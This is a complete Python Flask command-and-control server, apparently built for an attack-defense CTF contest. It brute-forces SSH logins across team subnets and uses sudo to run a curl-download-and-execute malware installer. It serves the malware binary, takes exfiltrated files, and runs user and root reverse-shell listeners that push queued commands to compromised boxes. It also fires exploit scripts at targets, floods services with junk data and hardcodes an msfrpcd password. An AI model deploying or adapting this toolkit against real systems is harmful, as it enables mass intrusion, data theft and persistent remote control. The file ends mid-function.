#!/usr/bin/env python3

import os
import random
import re
import socket
import string
import subprocess
import time
from base64 import b64decode
from datetime import datetime, timedelta
from threading import Thread

import paramiko
import requests
from flask import Flask, request, render_template, flash, redirect, url_for
from flask_bootstrap import Bootstrap
from flask_sqlalchemy import SQLAlchemy

# Constants
PORT = 80
DEBUG = False
MSFRPC_PW = "tHVdf97UqDZxmJuh"
TEMPLATE_DIR = "./templates/"
SCRIPTS_DIR = "./scripts/"
DB_FILE = "c2.db"
LOG_FILE = "c2.log"
THREADS = []

# Default settings
DEFAULT_SUBNET = "172.16.T.B"
DEFAULT_WHITELISTED_IPS = "127.0.0.1"
DEFAULT_FLAG_REGEX = "NCX\{[^\{\}]{1,100}\}"
DEFAULT_FLAG_SUBMIT_CONNECT_SID = ""
DEFAULT_FLAG_SUBMIT_RC_UID = ""
DEFAULT_FLAG_SUBMIT_RC_TOKEN = ""
DEFAULT_FLAG_SUBMIT_SESSION = ""
DEFAULT_MALWARE_PATH = "malware_installer"
DEFAULT_MALWARE_INSTALL = "curl -o installer http://CHANGE_ME/i && chmod +x installer && ./installer"
DEFAULT_MALWARE_REV_SHELL_PORT_USER = "445"
DEFAULT_MALWARE_REV_SHELL_PORT_ROOT = "443"
DEFAULT_STATUS_PWNED_TIMEOUT = "300"
DEFAULT_STATUS_FLAGS_TIMEOUT = "300"
DEFAULT_STATUS_INTERVAL = "10"
DEFAULT_RUN_SCRIPTS_INTERVAL = "30"
DEFAULT_SSH_BRUTEFORCE_INTERVAL = "30"
DEFAULT_SSH_BRUTEFORCE_TIMEOUT = "5"
DEFAULT_SPAM_INTERVAL_MIN = "5"
DEFAULT_SPAM_INTERVAL_MAX = "20"
DEFAULT_SPAM_TIMEOUT = "5"
DEFAULT_SPAM_RAND_FILE = "rand_file.txt"

# Create Flask and database
app = Flask(__name__, template_folder=TEMPLATE_DIR)
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///" + DB_FILE
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.secret_key = "CyberChef2"
db = SQLAlchemy(app)
Bootstrap(app)


def main():
    # Create the database
    db.create_all()

    # Create default settings
    add_setting("subnet", DEFAULT_SUBNET,
                "Subnet teams are on, T should replace team number and B should replace box IP")
    add_setting("whitelisted_ips", DEFAULT_WHITELISTED_IPS,
                "IPs, separated by commas and no spaces, that are allowed to access admin site")
    add_setting("flag_regex", DEFAULT_FLAG_REGEX, "Regex to search for flags with")
    add_setting("flag_submit_connect.sid", DEFAULT_FLAG_SUBMIT_CONNECT_SID, "Flag submission connect.sid cookie")
    add_setting("flag_submit_rc_uid", DEFAULT_FLAG_SUBMIT_RC_UID, "Flag submission rc_uid cookie")
    add_setting("flag_submit_rc_token", DEFAULT_FLAG_SUBMIT_RC_TOKEN, "Flag submission rc_token cookie")
    add_setting("flag_submit_session", DEFAULT_FLAG_SUBMIT_SESSION, "Flag submission session cookie")
    add_setting("malware_path", DEFAULT_MALWARE_PATH, "Path to first stage of binary")
    add_setting("malware_install", DEFAULT_MALWARE_INSTALL, "Command to install malware")
    add_setting("malware_rev_shell_port_user", DEFAULT_MALWARE_REV_SHELL_PORT_USER,
                "Port malware tries to connect to for user shell")
    add_setting("malware_rev_shell_port_root", DEFAULT_MALWARE_REV_SHELL_PORT_ROOT,
                "Port malware tries to connect to for root shell")
    add_setting("status_pwned_timeout", DEFAULT_STATUS_PWNED_TIMEOUT,
                "Timeout, in seconds, when to stop assuming box is pwned")
    add_setting("status_flags_timeout", DEFAULT_STATUS_FLAGS_TIMEOUT,
                "Timeout, in seconds, when to stop assuming box is getting flags")
    add_setting("status_interval", DEFAULT_STATUS_INTERVAL, "Seconds to wait between each status check")
    add_setting("run_scripts_interval", DEFAULT_RUN_SCRIPTS_INTERVAL, "Seconds to wait between running scripts")
    add_setting("ssh_bruteforce_interval", DEFAULT_SSH_BRUTEFORCE_INTERVAL,
                "Seconds to wait between each SSH bruteforce")
    add_setting("ssh_bruteforce_timeout", DEFAULT_SSH_BRUTEFORCE_TIMEOUT,
                "Seconds to wait for timeout during SSH bruteforce")
    add_setting("spam_interval_min", DEFAULT_SPAM_INTERVAL_MIN, "Minimum seconds to wait between each spam")
    add_setting("spam_interval_max", DEFAULT_SPAM_INTERVAL_MAX, "Maximum seconds to wait between each spam")
    add_setting("spam_timeout", DEFAULT_SPAM_TIMEOUT, "Seconds to wait for timeout during spamming")
    add_setting("spam_rand_file", DEFAULT_SPAM_RAND_FILE, "Path to file with random strings line by line")

    # Run MSFRPC
    subprocess.call("pkill msfrpcd", shell=True)
    subprocess.call(f"msfrpcd -P {MSFRPC_PW} -S -a 127.0.0.1", shell=True)

    # Start threads
    THREADS.append(Thread(target=status, name="status"))
    THREADS.append(Thread(target=rev_shell_user_server, name="rev_shell_user_server"))
    THREADS.append(Thread(target=rev_shell_root_server, name="rev_shell_root_server"))
    THREADS.append(Thread(target=run_scripts, name="run_scripts"))
    THREADS.append(Thread(target=ssh_bruteforce, name="ssh_bruteforce"))
    THREADS.append(Thread(target=spam, name="spam"))
    for thread in THREADS:
        thread.start()

    # Start Flask
    app.run(port=PORT, debug=DEBUG, host="0.0.0.0")


# <editor-fold desc="Admin Endpoints">

# Catch all 404s and 405s
@app.errorhandler(404)
@app.errorhandler(405)
def catch_all(e):
    return ""


# Protect the admin routes
@app.before_request
def check_admin():
    settings = Setting.query.get("whitelisted_ips")
    ips = settings.value.split(",")
    if request.path.startswith("/admin") and request.remote_addr not in ips:
        log("flask", f"{request.remote_addr} tried to access {request.path}")
        return ""


@app.route("/admin", methods=["GET"])
def admin_home():
    return render_template("home.html", total_boxes=Box.query.count(),
                           pwned_boxes=Box.query.filter_by(pwned=True).count(),
                           pwned_boxes_root=Box.query.filter_by(pwned_root=True).count(),
                           flag_boxes=Box.query.filter_by(flags=True).count(),
                           flags_found=Flag.query.count(),
                           flags_submitted=Flag.query.filter(Flag.submitted.isnot(None)).count())


@app.route("/admin/map", methods=["GET"])
def admin_map():
    return render_template("map.html")


@app.route("/admin/threads", methods=["GET"])
def admin_threads():
    return render_template("threads.html", threads=THREADS)


@app.route("/admin/threads/start", methods=["GET"])
def admin_threads_start():
    # Get parameters
    name = request.args.get("name")

    # Start the thread
    for thread in THREADS:
        if thread.name == name:
            thread.start()
            break

    # Flash and redirect
    flash("Thread started")
    log("admin", f"thread {name} started by {request.remote_addr}")
    return redirect(url_for("admin_threads"))


@app.route("/admin/logs", methods=["GET"])
def admin_logs():
    # Get parameters
    type = request.args.get("type")
    num = request.args.get("num")
    if type == "all":
        type = None

    # Query database
    if not num:
        num = 100
    else:
        num = int(num)
    if type:
        logs = Log.query.filter_by(type=type).order_by(Log.datetime.desc()).limit(num).all()
    else:
        type = "all"
        logs = Log.query.order_by(Log.datetime.desc()).limit(num).all()

    # Fix distinct query
    distinct = list(db.session.query(Log.type).distinct().all())
    types = []
    for d in distinct:
        types.append(d[0])

    return render_template("logs.html", logs=logs, selected_type=type, types=types, num=num)


@app.route("/admin/settings", methods=["GET"])
def admin_settings():
    return render_template("settings.html", settings=Setting.query.all())


@app.route("/admin/settings/update", methods=["POST"])
def admin_settings_update():
    # Get form data
    name = request.form.get("name")
    value = request.form.get("value")

    # Update in database
    setting = Setting.query.get(name)
    setting.value = value
    db.session.commit()

    # Flash and redirect
    flash("Setting updated")
    log("admin", f"setting {name} changed to {value} by {request.remote_addr}")
    return redirect(url_for("admin_settings"))


@app.route("/admin/teams", methods=["GET"])
def admin_teams():
    return render_template("teams.html", teams=Team.query.order_by(Team.num).all())


@app.route("/admin/teams/add", methods=["POST"])
def admin_teams_add():
    # Get form data
    num = int(request.form.get("num"))
    name = request.form.get("name")

    # Add to database
    db.session.add(Team(num, name))
    for service in Service.query.all():
        db.session.add(Box(num, service.ip, False, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Team added")
    log("admin", f"team {num} added by {request.remote_addr}")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/delete", methods=["GET"])
def admin_teams_delete():
    # Get parameters
    num = int(request.args.get("num"))

    # Delete from database
    team = Team.query.get(num)
    db.session.delete(team)
    db.session.commit()

    # Flash and redirect
    flash("Team deleted")
    log("admin", f"team {num} deleted by {request.remote_addr}")
    return redirect(url_for("admin_teams"))


@app.route("/admin/teams/update", methods=["POST"])
def admin_teams_update():
    # Get form data
    num = int(request.form.get("num"))
    name = request.form.get("name")

    # Update in database
    team = Team.query.get(num)
    team.name = name
    db.session.commit()

    # Flash and redirect
    flash("Team updated")
    log("admin", f"team {num} updated by {request.remote_addr}")
    return redirect(url_for("admin_teams"))


@app.route("/admin/services", methods=["GET"])
def admin_services():
    return render_template("services.html", services=Service.query.order_by(Service.ip).all())


@app.route("/admin/services/add", methods=["POST"])
def admin_services_add():
    # Get form data
    ip = int(request.form.get("ip"))
    name = request.form.get("name")
    port = int(request.form.get("port"))
    ssh_port = int(request.form.get("ssh_port"))

    # Add to database
    db.session.add(Service(ip, name, port, ssh_port))
    for team in Team.query.all():
        db.session.add(Box(team.num, ip, False, False, None, False, None))
    db.session.commit()

    # Flash and redirect
    flash("Service added")
    log("admin", f"service {ip} added by {request.remote_addr}")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/delete", methods=["GET"])
def admin_services_delete():
    # Get parameters
    ip = int(request.args.get("ip"))

    # Delete from database
    service = Service.query.get(ip)
    db.session.delete(service)
    db.session.commit()

    # Flash and redirect
    flash("Service deleted")
    log("admin", f"service {ip} deleted by {request.remote_addr}")
    return redirect(url_for("admin_services"))


@app.route("/admin/services/update", methods=["POST"])
def admin_services_update():
    # Get form data
    ip = int(request.form.get("ip"))
    name = request.form.get("name")
    port = int(request.form.get("port"))
    ssh_port = int(request.form.get("ssh_port"))

    # Update in database
    service = Service.query.get(ip)
    service.name = name
    service.port = port
    service.ssh_port = ssh_port
    db.session.commit()

    # Flash and redirect
    flash("Service updated")
    log("admin", f"service {ip} updated by {request.remote_addr}")
    return redirect(url_for("admin_services"))


@app.route("/admin/boxes", methods=["GET"])
def admin_boxes():
    return render_template("boxes.html", boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(),
                           subnet=half_subnet())


@app.route("/admin/flags", methods=["GET"])
def admin_flags():
    return render_template("flags.html", flags=Flag.query.order_by(Flag.found.desc()).all(), subnet=half_subnet())


@app.route("/admin/flags/submit", methods=["GET"])
def admin_flags_submit():
    flags = Flag.query.filter(Flag.submitted == None).all()
    submit_flags(flags)
    flash("Flags submitted")
    log("admin", f"submitting un-submitted flags from {request.remote_addr}")
    return redirect(url_for("admin_flags"))


@app.route("/admin/flags/mark", methods=["GET"])
def admin_flags_mark():
    # Get parameters
    id = int(request.args.get("id"))

    # Update in database
    flag = Flag.query.get(id)
    flag.submitted = datetime.now()
    db.session.commit()

    # Flash and redirect
    flash("Flag marked as submitted")
    log("admin", f"flag {id} marked as submitted by {request.remote_addr}")
    return redirect(url_for("admin_flags"))


@app.route("/admin/exfils", methods=["GET"])
def admin_exfils():
    return render_template("exfils.html", exfils=ExfilData.query.order_by(ExfilData.found.desc()).all(),
                           subnet=half_subnet())


@app.route("/admin/exfils/view", methods=["GET"])
def admin_exfils_view():
    # Get parameters
    id = int(request.args.get("id"))

    # Get from database
    exfil_data = ExfilData.query.get(id)

    # Return the data
    log("admin", f"exfil {id} viewed by {request.remote_addr}")
    return exfil_data.data


@app.route("/admin/scripts", methods=["GET"])
def admin_scripts():
    return render_template("scripts.html", scripts=Script.query.order_by(Script.id).all(),
                           services=Service.query.order_by(Service.ip).all(), scripts_dir=SCRIPTS_DIR)


@app.route("/admin/scripts/add", methods=["POST"])
def admin_scripts_add():
    # Get form data
    service_ip = int(request.form.get("service_ip"))
    path = request.form.get("path")
    target_pwned = str_to_bool(request.form.get("target_pwned"))

    # Add to database
    db.session.add(Script(service_ip, path, target_pwned))
    db.session.commit()

    # Flash and redirect
    flash("Script added")
    log("admin", f"script added by {request.remote_addr}")
    return redirect(url_for("admin_scripts"))


@app.route("/admin/scripts/delete", methods=["GET"])
def admin_scripts_delete():
    # Get parameters
    id = int(request.args.get("id"))

    # Delete from database
    script = Script.query.get(id)
    db.session.delete(script)
    db.session.commit()

    # Flash and redirect
    flash("Script deleted")
    log("admin", f"script {id} deleted by {request.remote_addr}")
    return redirect(url_for("admin_scripts"))


@app.route("/admin/scripts/update", methods=["POST"])
def admin_scripts_update():
    # Get form data
    id = int(request.form.get("id"))
    service_ip = int(request.form.get("service_ip"))
    path = request.form.get("path")
    target_pwned = str_to_bool(request.form.get("target_pwned"))

    # Update in database
    script = Script.query.get(id)
    script.service_ip = service_ip
    script.path = path
    script.target_pwned = target_pwned
    db.session.commit()

    # Flash and redirect
    flash("Script updated")
    log("admin", f"script {id} updated by {request.remote_addr}")
    return redirect(url_for("admin_scripts"))


@app.route("/admin/flagrets", methods=["GET"])
def admin_flagrets():
    return render_template("flagrets.html", flagrets=FlagRetrieval.query.all(),
                           services=Service.query.order_by(Service.ip).all())


@app.route("/admin/flagrets/add", methods=["POST"])
def admin_flagrets_add():
    # Get form data
    service_ip = int(request.form.get("service_ip"))
    root_shell = str_to_bool(request.form.get("root_shell"))
    command = request.form.get("command")

    # Add to database
    db.session.add(FlagRetrieval(service_ip, root_shell, command))
    db.session.commit()

    # Flash and redirect
    flash("Flag retrieval added")
    log("admin", f"flag retrieval added by {request.remote_addr}")
    return redirect(url_for("admin_flagrets"))


@app.route("/admin/flagrets/delete", methods=["GET"])
def admin_flagrets_delete():
    # Get parameters
    id = int(request.args.get("id"))

    # Delete from database
    flag_retrieval = FlagRetrieval.query.get(id)
    db.session.delete(flag_retrieval)
    db.session.commit()

    # Flash and redirect
    flash("Flag retrieval deleted")
    log("admin", f"flag retrieval {id} deleted by {request.remote_addr}")
    return redirect(url_for("admin_flagrets"))


@app.route("/admin/flagrets/update", methods=["POST"])
def admin_flagrets_update():
    # Get form data
    id = int(request.form.get("id"))
    service_ip = int(request.form.get("service_ip"))
    root_shell = str_to_bool(request.form.get("root_shell"))
    command = request.form.get("command")

    # Update in database
    flag_retrieval = FlagRetrieval.query.get(id)
    flag_retrieval.service_ip = service_ip
    flag_retrieval.root_shell = root_shell
    flag_retrieval.command = command
    db.session.commit()

    # Flash and redirect
    flash("Flag retrieval updated")
    log("admin", f"flag retrieval {id} updated by {request.remote_addr}")
    return redirect(url_for("admin_flagrets"))


@app.route("/admin/commands", methods=["GET"])
def admin_commands():
    return render_template("commands.html", queued_commands=QueuedCommand.query.all(),
                           boxes=Box.query.order_by(Box.team_num, Box.service_ip).all(), subnet=half_subnet())


@app.route("/admin/commands/add", methods=["POST"])
def admin_commands_add():
    # Get form data
    box = request.form.get("box")
    root_shell = str_to_bool(request.form.get("root_shell"))
    command = request.form.get("command")

    # Parse box and add to database
    if box == "all":
        for box in Box.query.all():
            db.session.add(QueuedCommand(box.team_num, box.service_ip, root_shell, command))
        db.session.commit()
    else:
        parts = box.split("-")
        box = Box.query.get((int(parts[0]), int(parts[1])))
        db.session.add(QueuedCommand(box.team_num, box.service_ip, root_shell, command))
        db.session.commit()

    # Flash and redirect
    flash("Queued command added")
    log("admin", f"queued command added by {request.remote_addr}")
    return redirect(url_for("admin_commands"))


@app.route("/admin/commands/delete", methods=["GET"])
def admin_commands_delete():
    # Get parameters
    id = int(request.args.get("id"))

    # Delete from database
    queued_command = QueuedCommand.query.get(id)
    db.session.delete(queued_command)
    db.session.commit()

    # Flash and redirect
    flash("Queued command deleted")
    log("admin", f"queued command {id} deleted by {request.remote_addr}")
    return redirect(url_for("admin_commands"))


@app.route("/admin/ssh", methods=["GET"])
def admin_ssh():
    return render_template("ssh.html", usernames=SSHUsername.query.order_by(SSHUsername.username).all(),
                           passwords=SSHPassword.query.order_by(SSHPassword.password).all())


@app.route("/admin/ssh/usernames/add", methods=["POST"])
def admin_ssh_usernames_add():
    # Get form data
    username = request.form.get("username")

    # Add to database
    db.session.add(SSHUsername(username))
    db.session.commit()

    # Flash and redirect
    flash("SSH username added")
    log("admin", f"SSH username {username} added by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/passwords/add", methods=["POST"])
def admin_ssh_passwords_add():
    # Get form data
    password = request.form.get("password")

    # Add to database
    db.session.add(SSHPassword(password))
    db.session.commit()

    # Flash and redirect
    flash("SSH password added")
    log("admin", f"SSH password {password} added by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/usernames/delete", methods=["GET"])
def admin_ssh_usernames_delete():
    # Get parameters
    username = request.args.get("username")

    # Delete from database
    ssh_username = SSHUsername.query.get(username)
    db.session.delete(ssh_username)
    db.session.commit()

    # Flash and redirect
    flash("SSH username deleted")
    log("admin", f"SSH username {username} deleted by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/passwords/delete", methods=["GET"])
def admin_ssh_passwords_delete():
    # Get parameters
    password = request.args.get("password")

    # Delete from database
    ssh_password = SSHPassword.query.get(password)
    db.session.delete(ssh_password)
    db.session.commit()

    # Flash and redirect
    flash("SSH password deleted")
    log("admin", f"SSH password {password} deleted by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/usernames/update", methods=["POST"])
def admin_ssh_usernames_update():
    # Get form data
    old_username = request.form.get("old_username")
    username = request.form.get("username")

    # Update in database
    ssh_username = SSHUsername.query.get(old_username)
    ssh_username.username = username
    db.session.commit()

    # Flash and redirect
    flash("SSH username updated")
    log("admin", f"SSH username {username} updated by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


@app.route("/admin/ssh/passwords/update", methods=["POST"])
def admin_ssh_passwords_update():
    # Get form data
    old_password = request.form.get("old_password")
    password = request.form.get("password")

    # Update in database
    ssh_password = SSHPassword.query.get(old_password)
    ssh_password.password = password
    db.session.commit()

    # Flash and redirect
    flash("SSH password updated")
    log("admin", f"SSH password {password} updated by {request.remote_addr}")
    return redirect(url_for("admin_ssh"))


# </editor-fold>

# <editor-fold desc="Malware Endpoints">

# Install route
@app.route("/i", methods=["GET"])
def install():
    with open(Setting.query.get("malware_path").value, "rb") as f:
        data = f.read()
    log("install_endpoint", f"install from {request.remote_addr}")
    return data


# Exfil route
@app.route("/e", methods=["POST"])
def exfil():
    # Get form data
    victimip = request.form.get("victimip")
    filename = request.form.get("filename")
    b64_data = request.form.get("file")

    # Check if it exists
    if not victimip:
        log("exfil_endpoint", f"victimip missing from {request.remote_addr}")
        return ""
    elif not filename:
        log("exfil_endpoint", f"filename missing from {request.remote_addr}")
        return ""
    elif not b64_data:
        log("exfil_endpoint", f"data missing from {request.remote_addr}")
        return ""

    # Decode data
    try:
        data = b64decode(b64_data).decode("utf-8")
    except:
        log("exfil_endpoint", f"b64 decode error on victimip {victimip} from {request.remote_addr}")
        return ""

    # Get team and service
    try:
        team = victimip.split(".")[2]
        service = victimip.split(".")[3]
    except:
        log("exfil_endpoint", f"error decoding IP {victimip} from {request.remote_addr}")
        return ""

    # Save the data and extract flags
    try:
        db.session.add(ExfilData(team, service, filename, data, datetime.now()))
        db.session.commit()
    except:
        log("exfil_endpoint",
            f"error adding data for team {team} and service {service} for file {filename} from {request.remote_addr}")
        return ""
    extract_flags(data, Box.query.get((team, service)), "exfil")
    log("exfil_endpoint", f"saved data from team {team} and service {service} from {request.remote_addr}")
    return ""


# </editor-fold>

# <editor-fold desc="Thread Functions">

def status():
    # Continue checking
    while True:

        # Get settings from database
        try:
            pwned_timeout = int(Setting.query.get("status_pwned_timeout").value)
        except:
            log("status", "Invalid status_pwned_timeout setting")
            pwned_timeout = DEFAULT_STATUS_PWNED_TIMEOUT
        try:
            flags_timeout = int(Setting.query.get("status_flags_timeout").value)
        except:
            log("status", "Invalid status_flags_timeout setting")
            flags_timeout = DEFAULT_STATUS_FLAGS_TIMEOUT
        try:
            interval = int(Setting.query.get("status_interval").value)
        except:
            log("status", "Invalid status_interval setting")
            interval = DEFAULT_STATUS_INTERVAL

        # Get all boxes
        boxes = Box.query.all()

        # Iterate over boxes
        for box in boxes:

            # Check if still pwned
            if box.pwned:
                delta = box.last_update + timedelta(seconds=pwned_timeout)
                if delta < datetime.now():
                    log("status", f"box with team {box.team_num} and service {box.service_ip} no longer pwned")
                    box.pwned = False
                    box.pwned_root = False
                    db.session.commit()

            # Check if still getting flags
            if box.flags:
                delta = box.last_flag + timedelta(seconds=flags_timeout)
                if delta < datetime.now():
                    log("status", f"box with team {box.team_num} and service {box.service_ip} no longer getting flags")
                    box.flags = False
                    db.session.commit()

        # Wait until next check
        log("status", f"sleeping for {interval} seconds")
        time.sleep(interval)


def rev_shell_user_server():
    # Get settings from database
    try:
        port = int(Setting.query.get("malware_rev_shell_port_user").value)
    except:
        log("rev_shell_user_server", "Invalid malware_rev_shell_port_user setting")
        port = DEFAULT_MALWARE_REV_SHELL_PORT_USER

    # Start listening
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen(30)
    log("rev_shell_user_server", f"listening on port {port}")

    # Keep accepting connections
    while True:
        (client, (client_ip, client_port)) = s.accept()
        log("rev_shell_user_server", f"new connection from {client_ip} on port {client_port}")
        Thread(target=new_rev_shell, args=[False, client, client_ip]).start()


def rev_shell_root_server():
    # Get settings from database
    try:
        port = int(Setting.query.get("malware_rev_shell_port_root").value)
    except:
        log("rev_shell_root_server", "Invalid malware_rev_shell_port_root setting")
        port = DEFAULT_MALWARE_REV_SHELL_PORT_ROOT

    # Start listening
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", port))
    s.listen(30)
    log("rev_shell_root_server", f"listening on port {port}")

    # Keep accepting connections
    while True:
        (client, (client_ip, client_port)) = s.accept()
        log("rev_shell_root_server", f"new connection from {client_ip} on port {client_port}")
        Thread(target=new_rev_shell, args=[True, client, client_ip]).start()


def new_rev_shell(root_shell, client, ip):
    # Set logging type
    if root_shell:
        log_type = "rev_shell_root_server"
    else:
        log_type = "rev_shell_user_server"

    # Check if valid IP
    if not ip.startswith(half_subnet()):
        log(log_type, f"invalid IP from {ip}")
        return

    # Update box pwned status
    parts = ip.split(".")
    team_num = int(parts[2])
    service_ip = int(parts[3])
    box = Box.query.get((team_num, service_ip))
    if not box:
        log(log_type, f"could not find box for ip {ip}")
        return
    box.pwned = True
    if root_shell:
        box.pwned_root = True
    box.last_update = datetime.now()
    db.session.commit()

    # Check for commands to run
    commands = []
    for flag_retrievals in FlagRetrieval.query.filter_by(service_ip=service_ip, root_shell=False).all():
        commands.append(flag_retrievals.command)
    for queued_command in QueuedCommand.query.filter_by(team_num=team_num, service_ip=service_ip,
                                                        root_shell=False).all():
        commands.append(queued_command.command)
        db.session.delete(queued_command)
        db.session.commit()
    if root_shell:
        for flag_retrievals in FlagRetrieval.query.filter_by(service_ip=service_ip, root_shell=True).all():
            commands.append(flag_retrievals.command)
        for queued_command in QueuedCommand.query.filter_by(team_num=team_num, service_ip=service_ip,
                                                            root_shell=True).all():
            commands.append(queued_command.command)
            db.session.delete(queued_command)
            db.session.commit()

    # Send the commands
    all_data = ""
    for command in commands:
        log(log_type, f"sending command '{command}' to IP {ip}")
        client.send(str.encode(command + "\n"))
        data = b""
        while True:
            data += client.recv(512)
            if len(data) < 1:
                break
        data = data.decode("utf-8")
        all_data += data + "\n"
        log(log_type, f"received '{data}' from IP {ip}")
    extract_flags(all_data, box, log_type)

    # Close the connection
    client.shutdown(2)
    client.close()


def run_scripts():
    # Continue running scripts
    while True:

        # Get settings from database
        subnet = Setting.query.get("subnet").value
        try:
            interval = int(Setting.query.get("run_scripts_interval").value)
        except:
            log("run_scripts", "Invalid run_scripts_interval setting")
            interval = DEFAULT_RUN_SCRIPTS_INTERVAL

        # Get all scripts
        scripts = Script.query.all()

        # Get all boxes
        boxes = Box.query.all()

        # Iterate over scripts
        for script in scripts:

            # Check if script exists
            path = SCRIPTS_DIR + script.path
            if not os.path.isfile(path):
                log("run_scripts", f"script {path} does not exist")
                continue

            # Iterate over boxes
            for box in boxes:
                if box.service_ip == script.service_ip and (script.target_pwned and not box.pwned):

                    # Run the script
                    ip = get_ip(subnet, box)
                    log("run_scripts", f"running script {script.path} against {ip}")
                    try:
                        output = subprocess.check_output(f"'./{path}' {ip}", shell=True, stderr=subprocess.STDOUT)
                    except subprocess.CalledProcessError as e:
                        log("run_scripts",
                            f"script {script.path} against {ip} failed with '{e.output.decode('utf-8')}'")
                        continue
                    output = output.decode("utf-8")
                    log("run_scripts", f"script {script.path} against {ip} received '{output}'")

                    # Extract the flags
                    extract_flags(output, box, f"script {script.path}")

        # Wait until next run
        log("run_scripts", f"sleeping for {interval} seconds")
        time.sleep(interval)


def ssh_bruteforce():
    # Continue trying
    while True:

        # Setup SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

        # Get settings from database
        subnet = Setting.query.get("subnet").value
        malware_install = Setting.query.get("malware_install").value
        try:
            interval = int(Setting.query.get("ssh_bruteforce_interval").value)
        except:
            log("ssh_bruteforce", "Invalid ssh_bruteforce_interval setting")
            interval = DEFAULT_SSH_BRUTEFORCE_INTERVAL
        try:
            timeout = int(Setting.query.get("ssh_bruteforce_timeout").value)
        except:
            log("ssh_bruteforce", "Invalid ssh_bruteforce_timeout setting")
            timeout = DEFAULT_SSH_BRUTEFORCE_TIMEOUT

        # Get SSH usernames and passwords
        usernames = SSHUsername.query.all()
        passwords = SSHPassword.query.all()

        # Get boxes that are not pwned
        boxes = Box.query.filter_by(pwned=False).all()

        # Iterate over boxes
        for box in boxes:

            # Get box IP
            ip = get_ip(subnet, box)

            # Iterate over usernames and passwords
            for username in usernames:
                username = username.username
                for password in passwords:
                    password = password.password
                    log("ssh_bruteforce",
                        f"trying {ip}:{box.service.ssh_port} with username {username} and password {password}")

                    # Try to SSH
                    try:
                        client.connect(
                            ip, port=box.service.ssh_port, username=username, password=password, timeout=timeout,
                            banner_timeout=timeout, auth_timeout=timeout)
                    except:
                        log("ssh_bruteforce",
                            f"failed to {ip}:{box.service.ssh_port} with username {username} and password {password}")
                        continue
                    log("ssh_bruteforce",
                        f"success to {ip}:{box.service.ssh_port} with username {username} and password {password}")

                    # Install malware
                    ssh_cmd(client, f"echo '{malware_install}' > thing.sh")
                    ssh_cmd(client, f"echo '{password}' | sudo -S sh thing.sh")
                    ssh_cmd(client, "rm thing.sh")

                    # Close the connection
                    client.close()

            # Wait until next try
            log("ssh_bruteforce", f"sleeping for {interval} seconds")
            time.sleep(interval)


def spam():
    # Continue spamming
    while True:

        # Get settings from database
        subnet = Setting.query.get("subnet").value
        try:
            interval_min = int(Setting.query.get("spam_interval_min").value)
        except:
            log("spam", "Invalid spam_interval_min setting")
            interval_min = DEFAULT_SPAM_INTERVAL_MIN
        try:
            interval_max = int(Setting.query.get("spam_interval_max").value)
        except:
            log("spam", "Invalid spam_interval_max setting")
            interval_max = DEFAULT_SPAM_INTERVAL_MAX
        try:
            timeout = int(Setting.query.get("spam_timeout").value)
        except:
            log("spam", "Invalid spam_timeout setting")
            timeout = DEFAULT_SPAM_TIMEOUT

        # Load random strings
        with open(Setting.query.get("spam_rand_file").value, "r") as f:
            data = f.read()
        strings = []
        for d in data.splitlines():
            strings.append(d.strip())

        # Get all boxes
        boxes = Box.query.all()

        # Iterate over boxes
        for box in boxes:

            # Get box IP
            ip = get_ip(subnet, box)
            log("spam", f"spamming {ip}:{box.service.port}")

            # Generate data
            data = []
            for _ in range(random.randint(2, 4)):
                choice = random.randint(0, 2)
                if choice == 0:
                    data.append(random_string(strings))
                elif choice == 1:
                    data.append(random_characters())
                elif choice == 2:
                    data.append(random_binary())

            # Send the data
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(timeout)
                s.connect((ip, box.service.port))
                for d in data:
                    s.send(d)
                s.close()
            except:
                log("spam", f"failure on {ip}:{box.service.port}")
                continue

        # Wait until next spam
        interval = random.randint(interval_min, interval_max)
        log("spam", f"sleeping for {interval} seconds")
        time.sleep(interval)


# </editor-fold>

# <editor-fold desc="Helper Functions">

def half_subnet():
    parts = Setting.query.get("subnet").value.split(".")
    return f"{parts[0]}.{parts[1]}."


def add_setting(name, default, description):
    if not Setting.query.get(name):
        db.session.add(Setting(name, default, description))
        db.session.commit()


def extract_flags(data, box, source):
    # Find and add the new flags to the database
    regex = re.compile(Setting.query.get("flag_regex").value)
    flags = re.findall(regex, data)
    new_flags = []
    for flag in flags:
        if not Flag.query.get(flag):
            new_flag = Flag(flag, box.team_num, box.service_ip, source, datetime.now(), None)
            new_flags.append(new_flag)
            db.session.add(new_flag)
            box.last_flag = datetime.now()
            box.flags = True
            db.session.commit()
            log("extract_flags",
                f"new flag {flag} added from team {box.team_num} and service {box.service_ip} from {source}")

    # Submit the flags
    submit_flags(new_flags)


def submit_flags(flags):
    # Get settings from database
    connect_sid = Setting.query.get("flag_submit_connect.sid").value
    rc_uid = Setting.query.get("flag_submit_rc_uid").value
    rc_token = Setting.query.get("flag_submit_rc_token").value
    session = Setting.query.get("flag_submit_session").value
    host = "https://combat.ctf.ncx2019.com/challenges"

    # Iterate over flags to submit
    for flag in flags:
        # TODO: submit the flag and check for success
        success = False
        if success:
            flag.submitted = datetime.now()
            db.session.commit()
            log("submit_flags", f"flag {flag} successfully submitted")
        else:
            log("submit_flags", f"failed to submit flag {flag}")


def get_ip(subnet, box):
    return subnet.replace("T", str(box.team_num)).replace("B", str(box.service_ip))


def ssh_cmd(client, command):
    log("ssh_bruteforce", f"running command '{command}'")
    stdin, stdout, stderr = client.exec_command(command)
    stdout = stdout.read().decode("utf-8")
    stderr = stderr.read().decode("utf-8")
